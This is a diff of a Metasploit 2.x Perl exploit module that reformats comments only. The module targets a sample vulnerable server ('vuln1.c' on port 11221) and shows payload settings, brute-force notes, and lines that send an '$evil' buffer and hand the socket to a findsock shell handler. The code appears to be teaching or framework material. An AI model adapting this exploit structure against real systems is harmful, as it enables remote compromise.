@@ -26,28 +26,33 @@ my $info = {
   'Arch'    => [ 'x86' ],
   'OS'      => [ 'linux'],
   'Priv'    => 1,
-# We don't advertise CPORT here, although we could.  It will
-# be needed if we use a findsock payload, and could be optionally
-# supplied if you just wanted to change your src port for other
-# reasons.
+
+  # We don't advertise CPORT here, although we could.  It will
+  # be needed if we use a findsock payload, and could be optionally
+  # supplied if you just wanted to change your src port for other
+  # reasons.
   'UserOpts'  =>
     {
       'RHOST' => [1, 'ADDR', 'The target address'],
-# Default to port to 11221, the port vuln1.c listens on
+
+      # Default to port to 11221, the port vuln1.c listens on
       'RPORT' => [1, 'PORT', 'The target port', 11221],
     },
   'Payload' =>
     {
-# We have a space limit because of the recv 4096, but its a big one
-# A bigger value would mean faster brute forcing (larger steps) but
-# also run the risk of running off the end of the stack
+      # We have a space limit because of the recv 4096, but its a big one
+      # A bigger value would mean faster brute forcing (larger steps) but
+      # also run the risk of running off the end of the stack
       'Space'     => 500,
-# No BadChars because the bug is a recv call
+
+      # No BadChars because the bug is a recv call
       'BadChars'  => "",
-# This means if we had a payload of 490 bytes in length it would
-# fail since there isn't room for 16 bytes of nop.
+
+      # This means if we had a payload of 490 bytes in length it would
+      # fail since there isn't room for 16 bytes of nop.
       'MinNops'   => 16, # This keeps brute forcing sane
-# We want to add support for findsock payloads
+
+      # We want to add support for findsock payloads
       'Keys'      => ['+findsock'],
     },
   'Description'  => Pex::Text::Freeform(qq{
@@ -57,9 +62,10 @@ my $info = {
     [
       'http://www.metasploit.com',
     ],
-# Setting this to -1 means that we won't pick a default target.
-# This is good if it is a 1 hit exploit, or if the target isn't
-# brute force, etc.
+
+  # Setting this to -1 means that we won't pick a default target.
+  # This is good if it is a 1 hit exploit, or if the target isn't
+  # brute force, etc.
   'DefaultTarget' => -1,
   'Targets' =>
     [
@@ -105,9 +111,9 @@ sub Exploit {
 
   $sock->Send($evil);
 
-# The Handler routine has to be called for findsock supporting exploits.
-# It will check the socket passed it, and see if there is a findsock
-# shell on the line.
+  # The Handler routine has to be called for findsock supporting exploits.
+  # It will check the socket passed it, and see if there is a findsock
+  # shell on the line.
   $self->Handler($sock);
 
   return;
